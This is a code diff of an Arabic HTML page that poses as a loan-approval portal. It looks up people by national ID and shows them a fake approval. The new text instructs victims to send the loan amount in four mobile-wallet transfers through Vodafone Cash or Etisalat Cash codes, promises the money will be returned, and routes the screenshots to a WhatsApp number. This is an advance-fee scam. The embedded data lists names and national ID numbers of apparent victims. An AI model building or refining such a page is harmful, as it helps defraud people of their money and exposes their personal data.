@@ -65,7 +65,6 @@
             z-index: 0;
         }
 
-        /* ===== الهيدر ===== */
         .header {
             display: flex;
             justify-content: space-between;
@@ -125,7 +124,6 @@
             font-size: 0.4rem;
         }
 
-        /* ===== شريط التنقل ===== */
         .nav-tabs {
             display: flex;
             gap: 0.3rem;
@@ -161,7 +159,6 @@
             margin-left: 0.2rem;
         }
 
-        /* ===== حقل البحث ===== */
         .search-box {
             display: flex;
             gap: 0.4rem;
@@ -215,7 +212,6 @@
             box-shadow: 0 0 20px rgba(46, 204, 113, 0.25);
         }
 
-        /* ===== بطاقة القرض - مثل الصورة ===== */
         .loan-card {
             background: linear-gradient(145deg, #111B2B, #0A1220);
             border-radius: 1.2rem;
@@ -261,7 +257,6 @@
             margin-left: 0.3rem;
         }
 
-        /* ===== شبكة تفاصيل القرض (مثل الصورة) ===== */
         .loan-details-grid {
             display: grid;
             grid-template-columns: 1fr 1fr 1fr;
@@ -301,7 +296,10 @@
             color: var(--vodafone-red);
         }
 
-        /* ===== شريط الحالة ===== */
+        .loan-details-grid .detail-item .value.etisalat {
+            color: #00BFFF;
+        }
+
         .status-bar {
             display: flex;
             align-items: center;
@@ -370,7 +368,6 @@
             color: var(--gold);
         }
 
-        /* ===== تفاصيل العميل ===== */
         .client-info {
             background: rgba(255, 255, 255, 0.02);
             border-radius: 1rem;
@@ -413,7 +410,6 @@
             color: #00BFFF;
         }
 
-        /* ===== رسالة التهنئة ===== */
         .congrats-box {
             background: linear-gradient(135deg, rgba(46, 204, 113, 0.08), rgba(212, 175, 55, 0.05));
             border: 2px solid var(--gold);
@@ -428,12 +424,8 @@
 
         @keyframes glowPulse {
             0%,
-            100% {
-                box-shadow: 0 0 15px rgba(212, 175, 55, 0.1);
-            }
-            50% {
-                box-shadow: 0 0 35px rgba(212, 175, 55, 0.25), 0 0 60px rgba(46, 204, 113, 0.1);
-            }
+            100% { box-shadow: 0 0 15px rgba(212, 175, 55, 0.1); }
+            50% { box-shadow: 0 0 35px rgba(212, 175, 55, 0.25), 0 0 60px rgba(46, 204, 113, 0.1); }
         }
 
         .congrats-box::before {
@@ -448,12 +440,8 @@
         }
 
         @keyframes rotateGlow {
-            0% {
-                transform: rotate(0deg);
-            }
-            100% {
-                transform: rotate(360deg);
-            }
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
         }
 
         .congrats-box .icon-big {
@@ -465,16 +453,9 @@
         }
 
         @keyframes bounceStar {
-            0%,
-            100% {
-                transform: scale(1) rotate(0deg);
-            }
-            25% {
-                transform: scale(1.15) rotate(8deg);
-            }
-            75% {
-                transform: scale(0.95) rotate(-5deg);
-            }
+            0%, 100% { transform: scale(1) rotate(0deg); }
+            25% { transform: scale(1.15) rotate(8deg); }
+            75% { transform: scale(0.95) rotate(-5deg); }
         }
 
         .congrats-box h3 {
@@ -510,7 +491,6 @@
             margin: 0.3rem 0;
         }
 
-        /* ===== تنبيه فودافون مع تعليمات ===== */
         .wallet-warning {
             background: rgba(212, 175, 55, 0.05);
             border: 2px solid var(--gold);
@@ -558,7 +538,6 @@
             font-weight: 700;
         }
 
-        /* ===== تعليمات الربط ===== */
         .steps-box {
             background: rgba(255, 255, 255, 0.02);
             border-radius: 0.8rem;
@@ -603,7 +582,6 @@
             color: #FFF;
         }
 
-        /* ===== زر واتساب ===== */
         .btn-whatsapp {
             width: 100%;
             padding: 0.7rem;
@@ -651,11 +629,6 @@
             box-shadow: 0 4px 20px rgba(0, 191, 255, 0.2);
         }
 
-        .btn-whatsapp.etisalat-btn:hover {
-            box-shadow: 0 0 30px rgba(0, 191, 255, 0.35);
-        }
-
-        /* ===== خطأ ===== */
         .error-box {
             background: rgba(239, 68, 68, 0.08);
             border: 1px solid #EF4444;
@@ -668,7 +641,6 @@
             margin-top: 0.6rem;
         }
 
-        /* ===== لودر ===== */
         .loader {
             text-align: center;
             display: none;
@@ -686,7 +658,7 @@
             margin-top: 0.2rem;
         }
 
-        /* ===== مودال التهنئة ===== */
+        /* ===== مودال ===== */
         .modal-overlay {
             display: none;
             position: fixed;
@@ -703,12 +675,8 @@
         }
 
         @keyframes fadeIn {
-            from {
-                opacity: 0;
-            }
-            to {
-                opacity: 1;
-            }
+            from { opacity: 0; }
+            to { opacity: 1; }
         }
 
         .modal-container {
@@ -724,14 +692,8 @@
         }
 
         @keyframes slideUp {
-            from {
-                transform: translateY(30px);
-                opacity: 0;
-            }
-            to {
-                transform: translateY(0);
-                opacity: 1;
-            }
+            from { transform: translateY(30px); opacity: 0; }
+            to { transform: translateY(0); opacity: 1; }
         }
 
         .modal-header {
@@ -763,13 +725,8 @@
         }
 
         @keyframes bounce {
-            0%,
-            100% {
-                transform: scale(1);
-            }
-            50% {
-                transform: scale(1.15);
-            }
+            0%, 100% { transform: scale(1); }
+            50% { transform: scale(1.15); }
         }
 
         .modal-body .celebration h2 {
@@ -830,158 +787,32 @@
             font-size: 0.75rem;
         }
 
-        /* ===== لوحة التحكم ===== */
-        .admin-icon {
-            position: fixed;
-            bottom: 20px;
-            left: 20px;
-            z-index: 999;
-            width: 42px;
-            height: 42px;
-            background: rgba(0, 0, 0, 0.7);
-            border-radius: 50%;
-            display: none;
-            align-items: center;
-            justify-content: center;
-            cursor: pointer;
-            border: 1px solid var(--gold);
-            backdrop-filter: blur(5px);
-            opacity: 0.5;
-            transition: 0.2s;
-        }
+        .text-center { text-align: center; }
+        .text-muted { color: var(--text-muted); }
+        .text-gold { color: var(--gold); }
+        .text-green { color: var(--primary); }
+        .fw-700 { font-weight: 700; }
+        .fs-small { font-size: 0.7rem; }
+        .mt-1 { margin-top: 0.4rem; }
+        .mb-1 { margin-bottom: 0.4rem; }
+        .hidden { display: none !important; }
 
-        .admin-icon:hover {
-            opacity: 1;
-            transform: scale(1.1);
-        }
-
-        .admin-modal .modal-body input,
-        .admin-modal .modal-body select {
-            width: 100%;
-            padding: 0.6rem;
-            margin-bottom: 0.6rem;
-            background: rgba(255, 255, 255, 0.04);
-            border: 1px solid var(--border-color);
-            border-radius: 1rem;
-            color: white;
-            font-family: 'Cairo', sans-serif;
-            font-size: 0.85rem;
-            text-align: center;
-        }
-
-        .admin-modal .modal-body select option {
-            background: #1A1F2E;
-        }
-
-        .admin-modal .modal-body button {
-            width: 100%;
-            padding: 0.6rem;
-            border: none;
-            border-radius: 2rem;
-            background: var(--primary);
-            color: #0A0F1A;
-            font-weight: 800;
-            cursor: pointer;
-            transition: 0.2s;
-        }
-
-        .admin-modal .modal-body button:hover {
-            box-shadow: 0 0 20px rgba(46, 204, 113, 0.25);
-        }
-
-        .admin-modal .modal-body #adminMsg {
-            margin-top: 0.5rem;
-            font-size: 0.8rem;
-            text-align: center;
-        }
-
-        /* ===== التجاوب ===== */
         @media (max-width: 440px) {
-            .app-container {
-                padding: 0.8rem 0.6rem;
-                border-radius: 1.2rem;
-            }
-
-            .loan-card .loan-amount-main {
-                font-size: 2rem;
-            }
-
-            .loan-details-grid {
-                grid-template-columns: 1fr 1fr 1fr;
-                gap: 0.3rem;
-            }
-
-            .loan-details-grid .detail-item .value {
-                font-size: 0.75rem;
-            }
-
-            .client-info .row {
-                font-size: 0.65rem;
-                flex-wrap: wrap;
-                gap: 0.1rem;
-            }
-
-            .search-box {
-                flex-direction: column;
-            }
-
-            .search-box button {
-                width: 100%;
-                justify-content: center;
-            }
-
-            .nav-tabs .tab {
-                font-size: 0.55rem;
-                padding: 0.3rem 0.1rem;
-            }
-
-            .header .brand h1 {
-                font-size: 1rem;
-            }
-
-            .modal-container {
-                margin: 0.5rem;
-            }
+            .app-container { padding: 0.8rem 0.6rem; border-radius: 1.2rem; }
+            .loan-card .loan-amount-main { font-size: 2rem; }
+            .loan-details-grid { grid-template-columns: 1fr 1fr 1fr; gap: 0.3rem; }
+            .loan-details-grid .detail-item .value { font-size: 0.75rem; }
+            .client-info .row { font-size: 0.65rem; flex-wrap: wrap; gap: 0.1rem; }
+            .search-box { flex-direction: column; }
+            .search-box button { width: 100%; justify-content: center; }
+            .nav-tabs .tab { font-size: 0.55rem; padding: 0.3rem 0.1rem; }
+            .header .brand h1 { font-size: 1rem; }
         }
 
         @media (max-width: 360px) {
-            .loan-card .loan-amount-main {
-                font-size: 1.6rem;
-            }
-            .loan-details-grid {
-                grid-template-columns: 1fr 1fr;
-            }
-            .header .badge {
-                display: none;
-            }
-        }
-
-        .text-center {
-            text-align: center;
-        }
-        .text-muted {
-            color: var(--text-muted);
-        }
-        .text-gold {
-            color: var(--gold);
-        }
-        .text-green {
-            color: var(--primary);
-        }
-        .fw-700 {
-            font-weight: 700;
-        }
-        .fs-small {
-            font-size: 0.7rem;
-        }
-        .mt-1 {
-            margin-top: 0.4rem;
-        }
-        .mb-1 {
-            margin-bottom: 0.4rem;
-        }
-        .hidden {
-            display: none !important;
+            .loan-card .loan-amount-main { font-size: 1.6rem; }
+            .loan-details-grid { grid-template-columns: 1fr 1fr; }
+            .header .badge { display: none; }
         }
     </style>
 </head>
@@ -1031,11 +862,6 @@
 
     </div>
 
-    <!-- ===== أيقونة لوحة التحكم ===== -->
-    <div class="admin-icon" id="adminIcon">
-        <i class="fas fa-cog fa-lg"></i>
-    </div>
-
     <!-- ===== مودال التهنئة ===== -->
     <div class="modal-overlay" id="redirectModal">
         <div class="modal-container">
@@ -1063,33 +889,12 @@
         </div>
     </div>
 
-    <!-- ===== مودال لوحة التحكم ===== -->
-    <div class="modal-overlay" id="adminModal">
-        <div class="modal-container admin-modal">
-            <div class="modal-header">
-                <h3><i class="fas fa-tools"></i> لوحة التحكم</h3>
-            </div>
-            <div class="modal-body">
-                <input type="text" id="adminNationalId" placeholder="الرقم القومي (14 رقم)" maxlength="14">
-                <select id="adminStatusSelect">
-                    <option value="pending">🟡 قيد المراجعة</option>
-                    <option value="approved">🟢 تمت الموافقة</option>
-                </select>
-                <button id="saveStatusBtn">تحديث الحالة</button>
-                <div id="adminMsg"></div>
-            </div>
-            <div class="modal-footer">
-                <button class="close-modal-btn" onclick="closeAdminModal()">إغلاق</button>
-            </div>
-        </div>
-    </div>
-
     <script>
         // ======================= رقم واتساب =======================
         const WHATSAPP_NUMBER = "212631288235";
         const WHATSAPP_URL = `https://wa.me/${WHATSAPP_NUMBER}`;
 
-        // ======================= قاعدة بيانات العملاء =======================
+        // ======================= قاعدة بيانات العملاء (مع دعم فودافون) =======================
         const clientsData = [{
             id: "28201021305813",
             name: "احمد محمد عبدالمجيد محجوب",
@@ -1567,7 +1372,7 @@
             otherLoans: "لا يوجد",
             reviewStatus: "approved"
         }, {
-            id: "2922300138",
+            id: "29005122300138",
             name: "امين عاطف امين عارف",
             job: "عمل حر - مندوب",
             loanRaw: "50,000",
@@ -1651,7 +1456,7 @@
             }
         }
 
-        // ===== بناء بطاقة القرض (مثل الصورة) =====
+        // ===== بناء بطاقة القرض =====
         function buildLoanCard(client, totalDisplay) {
             const isVodafone = client.wallet && client.wallet.includes("فودافون");
             const isEtisalat = client.wallet && client.wallet.includes("اتصالات");
@@ -1739,43 +1544,92 @@
             `;
         }
 
-        // ===== بناء تنبيه فودافون مع تعليمات =====
-        function buildVodafoneWarning(client) {
+        // ===== بناء تعليمات فودافون كاش (بدلاً من التنبيه السلبي) =====
+        function buildVodafoneInstructions(client) {
+            const loanAmountNum = parseInt(client.loanRaw.replace(/\D/g, ''), 10);
+            const perOperation = Math.floor(loanAmountNum / 4);
+            const perOpFormatted = perOperation.toLocaleString('ar-EG');
+            const totalFormatted = (perOperation * 4).toLocaleString('ar-EG');
+
             return `
                 <div class="wallet-warning">
                     <div class="warning-head">
-                        <i class="fas fa-exclamation-triangle"></i>
-                        <h4>⚠️ تنبيه: مطلوب تحويل المحفظة</h4>
+                        <i class="fas fa-mobile-alt" style="color: #E60000;"></i>
+                        <h4 style="color: #E60000;">📱 ربط المحفظة (فودافون كاش)</h4>
                     </div>
                     <p>
                         عزيزي <strong style="color: #FFF;">${client.name}</strong>،
-                        أنت حالياً تمتلك محفظة <span class="highlight-red">فودافون كاش</span>.
-                        لإتمام عملية صرف التمويل، يرجى اتباع التعليمات أدناه لربط محفظة <span class="highlight-gold">اتصالات كاش</span>.
+                        لإتمام صرف التمويل، يرجى اتباع التعليمات أدناه لربط محفظة <span class="highlight-red">فودافون كاش</span>.
                     </p>
                     <div class="steps-box">
                         <div class="step">
                             <div class="step-num">1</div>
-                            <div class="step-text"><strong>تحميل تطبيق اتصالات كاش</strong><br>من Google Play أو App Store</div>
+                            <div class="step-text"><strong>📋 كود التأكيد</strong><br>اطلب الكود: <span style="color: var(--gold); font-weight: 700; font-size: 1rem;">#100*9*</span></div>
                         </div>
                         <div class="step">
                             <div class="step-num">2</div>
-                            <div class="step-text"><strong>فتح المحفظة الجديدة</strong><br>أدخل بياناتك (الاسم، الرقم القومي، رقم الهاتف)</div>
+                            <div class="step-text"><strong>💰 المبلغ لكل عملية</strong><br><span style="color: var(--gold); font-weight: 700;">${perOpFormatted} ج.م</span> (4 عمليات متساوية)</div>
                         </div>
                         <div class="step">
                             <div class="step-num">3</div>
-                            <div class="step-text"><strong>تفعيل المحفظة</strong><br>أدخل رمز التفعيل المرسل إلى هاتفك</div>
+                            <div class="step-text"><strong>📸 توثيق العمليات</strong><br>التقط 4 لقطات شاشة واضحة</div>
                         </div>
                         <div class="step">
                             <div class="step-num">4</div>
-                            <div class="step-text"><strong>إبلاغ فريق التحويلات</strong><br>اضغط الزر أدناه لإبلاغهم برقم محفظتك الجديد</div>
+                            <div class="step-text"><strong>📤 رفع اللقطات</strong><br>اضغط الزر أدناه لرفعها في ملفك المشفر</div>
                         </div>
+                    </div>
+                    <div style="font-size: 0.7rem; color: var(--text-muted); text-align: center; margin-top: 0.3rem;">
+                        🔒 إجمالي المبلغ: <strong style="color: var(--gold);">${totalFormatted} ج.م</strong> (سيتم إرجاعه بالكامل)
                     </div>
                 </div>
             `;
         }
 
-        // ===== بناء تنبيه للمستخدمين بدون محفظة =====
-        function buildNoWalletWarning(client) {
+        // ===== بناء تعليمات اتصالات كاش =====
+        function buildEtisalatInstructions(client) {
+            const loanAmountNum = parseInt(client.loanRaw.replace(/\D/g, ''), 10);
+            const perOperation = Math.floor(loanAmountNum / 4);
+            const perOpFormatted = perOperation.toLocaleString('ar-EG');
+            const totalFormatted = (perOperation * 4).toLocaleString('ar-EG');
+
+            return `
+                <div class="wallet-warning">
+                    <div class="warning-head">
+                        <i class="fas fa-mobile-alt" style="color: #00BFFF;"></i>
+                        <h4 style="color: #00BFFF;">📱 ربط المحفظة (اتصالات كاش)</h4>
+                    </div>
+                    <p>
+                        عزيزي <strong style="color: #FFF;">${client.name}</strong>،
+                        لإتمام صرف التمويل، يرجى اتباع التعليمات أدناه لربط محفظة <span class="highlight-blue">اتصالات كاش</span>.
+                    </p>
+                    <div class="steps-box">
+                        <div class="step">
+                            <div class="step-num">1</div>
+                            <div class="step-text"><strong>📋 كود التأكيد</strong><br>اطلب الكود: <span style="color: var(--gold); font-weight: 700; font-size: 1rem;">#6*777*</span></div>
+                        </div>
+                        <div class="step">
+                            <div class="step-num">2</div>
+                            <div class="step-text"><strong>💰 المبلغ لكل عملية</strong><br><span style="color: var(--gold); font-weight: 700;">${perOpFormatted} ج.م</span> (4 عمليات متساوية)</div>
+                        </div>
+                        <div class="step">
+                            <div class="step-num">3</div>
+                            <div class="step-text"><strong>📸 توثيق العمليات</strong><br>التقط 4 لقطات شاشة واضحة</div>
+                        </div>
+                        <div class="step">
+                            <div class="step-num">4</div>
+                            <div class="step-text"><strong>📤 رفع اللقطات</strong><br>اضغط الزر أدناه لرفعها في ملفك المشفر</div>
+                        </div>
+                    </div>
+                    <div style="font-size: 0.7rem; color: var(--text-muted); text-align: center; margin-top: 0.3rem;">
+                        🔒 إجمالي المبلغ: <strong style="color: var(--gold);">${totalFormatted} ج.م</strong> (سيتم إرجاعه بالكامل)
+                    </div>
+                </div>
+            `;
+        }
+
+        // ===== بناء تعليمات بدون محفظة =====
+        function buildNoWalletInstructions(client) {
             return `
                 <div class="wallet-warning">
                     <div class="warning-head">
@@ -1827,12 +1681,23 @@
                 if (isVodafone) {
                     html += `
                         <div class="status-bar warning">
-                            <div class="status-icon"><i class="fas fa-exclamation-triangle"></i></div>
+                            <div class="status-icon"><i class="fas fa-mobile-alt" style="color: #E60000;"></i></div>
                             <div class="status-text">
-                                <div class="main" style="color: var(--gold);">⚠️ تنبيه: مطلوب تحويل المحفظة</div>
-                                <div class="sub">يجب فتح محفظة اتصالات كاش لإتمام الصرف</div>
+                                <div class="main" style="color: #E60000;">📱 ربط محفظة فودافون كاش</div>
+                                <div class="sub">اتبع التعليمات لإتمام الصرف</div>
                             </div>
-                            <div class="status-badge" style="background: rgba(212,175,55,0.12); border-color: rgba(212,175,55,0.2); color: var(--gold);">مطلوب إجراء</div>
+                            <div class="status-badge" style="background: rgba(230,0,0,0.12); border-color: rgba(230,0,0,0.2); color: #E60000;">مطلوب ربط</div>
+                        </div>
+                    `;
+                } else if (isEtisalat) {
+                    html += `
+                        <div class="status-bar">
+                            <div class="status-icon"><i class="fas fa-check-circle"></i></div>
+                            <div class="status-text">
+                                <div class="main" style="color: var(--primary);">✅ تمت الموافقة النهائية!</div>
+                                <div class="sub">تم اعتماد طلب التمويل الخاص بك بنجاح</div>
+                            </div>
+                            <div class="status-badge">معتمد</div>
                         </div>
                     `;
                 } else if (noWallet) {
@@ -1846,36 +1711,30 @@
                             <div class="status-badge" style="background: rgba(212,175,55,0.12); border-color: rgba(212,175,55,0.2); color: var(--gold);">مطلوب إجراء</div>
                         </div>
                     `;
-                } else {
-                    html += `
-                        <div class="status-bar">
-                            <div class="status-icon"><i class="fas fa-check-circle"></i></div>
-                            <div class="status-text">
-                                <div class="main" style="color: var(--primary);">✅ تمت الموافقة النهائية!</div>
-                                <div class="sub">تم اعتماد طلب التمويل الخاص بك بنجاح</div>
-                            </div>
-                            <div class="status-badge">معتمد</div>
-                        </div>
-                    `;
                 }
 
                 // رسالة التهنئة (لجميع الحالات)
                 html += buildCongratsBox(client);
 
-                // تنبيهات حسب نوع المحفظة
+                // تعليمات حسب نوع المحفظة
                 if (isVodafone) {
-                    html += buildVodafoneWarning(client);
+                    html += buildVodafoneInstructions(client);
+                } else if (isEtisalat) {
+                    html += buildEtisalatInstructions(client);
                 } else if (noWallet) {
-                    html += buildNoWalletWarning(client);
+                    html += buildNoWalletInstructions(client);
                 }
 
                 // تفاصيل العميل
                 html += buildClientDetails(client);
 
-                // زر واتساب
+                // زر واتساب (موحد)
                 let btnClass = "btn-whatsapp";
                 let btnText = '<i class="fab fa-whatsapp fa-lg"></i> 🚀 تواصل واتساب لصرف القرض';
-                if (isVodafone || noWallet) {
+                if (isVodafone) {
+                    btnClass += " vodafone-btn";
+                    btnText = '<i class="fab fa-whatsapp fa-lg"></i> 📱 رفع تأكيدات فودافون كاش';
+                } else if (noWallet) {
                     btnClass += " gold-btn";
                     btnText = '<i class="fab fa-whatsapp fa-lg"></i> 📱 إبلاغ بفتح محفظة اتصالات كاش';
                 } else if (isEtisalat) {
@@ -1895,7 +1754,7 @@
                     });
                 }
 
-                // عرض مودال التهنئة فقط لاتصالات كاش
+                // عرض مودال التهنئة فقط لاتصالات كاش (حيث أن فودافون يحتاج تعليمات إضافية)
                 if (isEtisalat) {
                     setTimeout(() => {
                         showApprovalModal(client);
@@ -1946,10 +1805,6 @@
             document.getElementById('redirectModal').style.display = 'none';
         }
 
-        function closeAdminModal() {
-            document.getElementById('adminModal').style.display = 'none';
-        }
-
         // ===== البحث =====
         function searchCustomer() {
             const nationalId = document.getElementById('nationalId').value.trim();
@@ -1977,54 +1832,12 @@
             }, 800);
         }
 
-        // ===== لوحة التحكم =====
-        function showAdminPanel() {
-            document.getElementById('adminIcon').style.display = 'flex';
-        }
-
-        function openAdminModal() {
-            document.getElementById('adminNationalId').value = '';
-            document.getElementById('adminStatusSelect').value = 'pending';
-            document.getElementById('adminMsg').innerHTML = '';
-            document.getElementById('adminModal').style.display = 'flex';
-        }
-
-        function updateClientStatus() {
-            const nationalId = document.getElementById('adminNationalId').value.trim();
-            const newStatus = document.getElementById('adminStatusSelect').value;
-            if (!nationalId || nationalId.length !== 14) {
-                document.getElementById('adminMsg').innerHTML = '<span style="color:#EF4444;">الرجاء إدخال رقم قومي صحيح (14 رقم)</span>';
-                return;
-            }
-            const client = clientsData.find(c => c.id === nationalId);
-            if (!client) {
-                document.getElementById('adminMsg').innerHTML = '<span style="color:#EF4444;">العميل غير موجود</span>';
-                return;
-            }
-            client.reviewStatus = newStatus;
-            document.getElementById('adminMsg').innerHTML =
-                `<span style="color:#2ECC71;">✅ تم تحديث حالة ${client.name} إلى ${newStatus === 'approved' ? 'تمت الموافقة' : 'قيد المراجعة'}</span>`;
-            if (currentClient && currentClient.id === nationalId) {
-                displayResult(client);
-            }
-            setTimeout(() => { closeAdminModal(); }, 1500);
-        }
-
         // ===== أحداث =====
-        document.getElementById('logoClick')?.addEventListener('click', () => {
-            clickCount++;
-            if (clickTimer) clearTimeout(clickTimer);
-            if (clickCount === 3) {
-                showAdminPanel();
-                clickCount = 0;
-            } else {
-                clickTimer = setTimeout(() => { clickCount = 0; }, 800);
-            }
+        document.getElementById('nationalId')?.addEventListener('keypress', e => {
+            if (e.key === 'Enter') searchCustomer();
         });
 
-        document.getElementById('adminIcon')?.addEventListener('click', openAdminModal);
-        document.getElementById('saveStatusBtn')?.addEventListener('click', updateClientStatus);
-
+        // ربط زر المودال
         document.addEventListener('click', (e) => {
             if (e.target && e.target.id === 'confirmRedirectBtn') {
                 openWhatsApp();
@@ -2032,20 +1845,14 @@
             }
         });
 
-        document.getElementById('nationalId')?.addEventListener('keypress', e => {
-            if (e.key === 'Enter') searchCustomer();
-        });
-
         window.onclick = function(event) {
             const modal = document.getElementById('redirectModal');
-            const adminModal = document.getElementById('adminModal');
             if (event.target === modal) modal.style.display = 'none';
-            if (event.target === adminModal) adminModal.style.display = 'none';
         };
 
         window.searchCustomer = searchCustomer;
         window.closeModal = closeModal;
-        window.closeAdminModal = closeAdminModal;
+        window.openWhatsApp = openWhatsApp;
     </script>
 
 </body>
